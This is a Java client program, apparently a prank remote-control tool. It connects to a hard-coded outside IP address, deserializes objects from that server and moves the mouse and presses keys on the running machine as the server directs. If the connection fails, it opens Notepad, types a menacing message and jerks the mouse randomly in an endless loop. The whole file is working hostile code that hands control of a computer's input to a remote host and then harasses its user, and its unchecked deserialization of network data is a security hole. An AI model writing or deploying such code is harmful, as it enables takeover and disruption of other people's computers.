import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Random;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Point;

/**
 * Property of CASpirations No touchy or else we sue. If this is on your
 * computer you owe us $1000000 million
 */

class Client {
    public static void main(String[] args) throws UnknownHostException, IOException, AWTException {
       

        // create a robot which is going to move the mouse
        Robot robot = new Robot();
        for(int i = 5; i > 0; i--) {
            System.out.println(i);
            robot.delay(1000);
        }

        // create socket at ipv4 with port 6969 ;)
        Socket socket = new Socket("208.84.138.20", 6969);

        
        
        // set up an inputstream to receive info from server
        ObjectInputStream input = new ObjectInputStream(socket.getInputStream());
        
        try {
            while (true) {
                // receive input from server and move mouse to point that the server sent
                Adrian serverInfo = (Adrian) input.readObject();
                System.out.println(serverInfo);
                robot.mouseMove(serverInfo.getMouse().x, serverInfo.getMouse().y);

                if(serverInfo.getKeyPressed() > 0) {
//                     tempKey = serverInfo.getKeyPressed();
                    robot.keyPress(KeyEvent.getExtendedKeyCodeForChar(serverInfo.getKeyPressed()));
//                     System.out.println("Pressed " + tempKey);
                    robot.keyRelease(KeyEvent.getExtendedKeyCodeForChar(serverInfo.getKeyPressed()));
                }
//                 else {
//                     try {
// //                         robot.keyRelease(tempKey);
//                         // System.out.println("Released " + tempKey);
//                     }
//                     catch(Exception e) {

//                     }
// //                     tempKey = -1;
//                 }
            }
        } catch (Exception e) {
            System.out.println("Starting Process");
            ProcessBuilder process = new ProcessBuilder("notepad.exe");
            Process notepadOpen = process.start();

            robot.delay(1000);
            type("You cannot escape your endless torment.");
            robot.delay(1000);
            startTheFrickening();
        }
    }

    public static void type(String str) throws AWTException {
        Robot robot = new Robot();

        for(char c : str.toCharArray()) {

            if(Character.isUpperCase(c))
                robot.keyPress(KeyEvent.VK_SHIFT);
            
            int keycode = KeyEvent.getExtendedKeyCodeForChar(c);

            robot.keyPress(keycode);
            robot.keyRelease(keycode);

            if(Character.isUpperCase(c))
                robot.keyRelease(KeyEvent.VK_SHIFT);
            
            robot.delay(150);
        } 
    }

    public static void startTheFrickening() throws AWTException {
        Robot robot = new Robot();
        Random random = new Random();
        Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();

        int width = (int)screen.getWidth();
        int height = (int)screen.getHeight();

        while(true) {
            robot.mouseMove(random.nextInt(width), random.nextInt(height));
            robot.delay(25);
        }
    }
}
